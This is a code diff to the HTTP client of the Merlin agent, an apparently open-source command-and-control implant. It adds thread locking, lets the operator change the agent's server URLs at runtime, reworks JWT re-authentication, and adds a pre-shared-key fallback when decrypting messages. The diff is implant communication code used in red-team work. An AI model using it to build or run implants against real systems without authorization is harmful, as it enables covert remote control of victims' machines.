@@ -35,6 +35,7 @@ import (
 	"net/url"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	// 3rd Party
@@ -65,7 +66,6 @@ import (
 	"github.com/Ne0nd0g/merlin-agent/transformers/encrypters/jwe"
 	"github.com/Ne0nd0g/merlin-agent/transformers/encrypters/rc4"
 	"github.com/Ne0nd0g/merlin-agent/transformers/encrypters/xor"
-	opaque2 "github.com/Ne0nd0g/merlin/pkg/opaque"
 )
 
 // Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
@@ -87,6 +87,7 @@ type Client struct {
 	AgentID       uuid.UUID                 // AgentID the Agent's unique identifier
 	currentURL    int                       // the current URL the agent is communicating with
 	transformers  []transformer.Transformer // Transformers an ordered list of transforms (encoding/encryption) to apply when constructing a message
+	sync.Mutex
 }
 
 // Config is a structure that is used to pass in all necessary information to instantiate a new Client
@@ -487,17 +488,7 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	case 200:
 		break
 	case 401:
-		cli.Message(cli.NOTE, "Server returned a 401, re-registering and re-authenticating this orphaned agent")
-		base := messages.Base{
-			ID:      client.AgentID,
-			Type:    messages.OPAQUE,
-			Payload: opaque2.Opaque{Type: opaque2.ReRegister},
-		}
-		err = client.Authenticate(base)
-		return
-	case 403:
-		// Re-Authenticate to the HTTP listener, not the Merlin server
-		cli.Message(cli.NOTE, "Server returned a 403, likely from an expired JWT. Re-authenticating...")
+		cli.Message(cli.NOTE, "Server returned a 401, generating JWT with PSK and trying again...")
 		client.JWT, err = client.getJWT()
 		if err != nil {
 			cli.Message(cli.WARN, fmt.Sprintf("clients/http.Send(): there was an error generating a self-signed JWT: %s", err))
@@ -556,11 +547,27 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 }
 
 // Set is a generic function that is used to modify a Client's field values
-func (client *Client) Set(key string, value string) error {
-	cli.Message(cli.DEBUG, "Entering into clients.http.Set()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
-	var err error
+func (client *Client) Set(key string, value string) (err error) {
+	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Set(): entering into function with key: %s, value: %s", key, value))
+	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Set(): exiting function with err: %v", err))
+
+	client.Lock()
+	defer client.Unlock()
+
 	switch strings.ToLower(key) {
+	case "addr":
+		// Parse the string for a comma seperated list of URLs
+		urls := strings.Split(strings.ReplaceAll(value, " ", ""), ",")
+		// Validate each URL
+		for _, u := range urls {
+			_, err = url.Parse(u)
+			if err != nil {
+				err = fmt.Errorf("clients/http.Set(): there was an error parsing the URL %s: %s", u, err)
+				return
+			}
+		}
+		client.URL = urls
+		client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3)
 	case "ja3":
 		ja3String := strings.Trim(value, "\"'")
 		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String)
@@ -580,23 +587,24 @@ func (client *Client) Set(key string, value string) error {
 	default:
 		err = fmt.Errorf("unknown http client setting: %s", key)
 	}
-	return err
+	return
 }
 
 // Get is a generic function that is used to retrieve the value of a Client's field
-func (client *Client) Get(key string) string {
-	cli.Message(cli.DEBUG, "Entering into clients.http.Get()...")
-	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s", key))
+func (client *Client) Get(key string) (value string) {
+	cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Get(): entering into function with key: %s", key))
+	defer cli.Message(cli.DEBUG, fmt.Sprintf("clients/http.Get(): leaving function with value: %s", value))
 	switch strings.ToLower(key) {
 	case "ja3":
-		return client.JA3
+		value = client.JA3
 	case "paddingmax":
-		return strconv.Itoa(client.PaddingMax)
+		value = strconv.Itoa(client.PaddingMax)
 	case "protocol":
-		return client.Protocol
+		value = client.Protocol
 	default:
-		return fmt.Sprintf("unknown client configuration setting: %s", key)
+		value = fmt.Sprintf("unknown client configuration setting: %s", key)
 	}
+	return
 }
 
 // Authenticate is the top-level function used to authenticate an agent to server using a specific authentication protocol
@@ -690,7 +698,16 @@ func (client *Client) Deconstruct(data []byte) (messages.Base, error) {
 		//fmt.Printf("Transformer %T: %+v\n", transform, transform)
 		ret, err := transform.Deconstruct(data, client.secret)
 		if err != nil {
-			return messages.Base{}, err
+			cli.Message(cli.WARN, fmt.Sprintf("clients/http.Deconstruct(): unable to deconstruct with Agent's secret, retrying with PSK"))
+			// Try to see if the PSK works
+			k := sha256.Sum256([]byte(client.psk))
+			ret, err = transform.Deconstruct(data, k[:])
+			if err != nil {
+				return messages.Base{}, err
+			}
+			// If the PSK worked, assume the agent is unauthenticated to the server
+			client.authenticated = false
+			client.secret = k[:]
 		}
 		switch ret.(type) {
 		case []uint8:
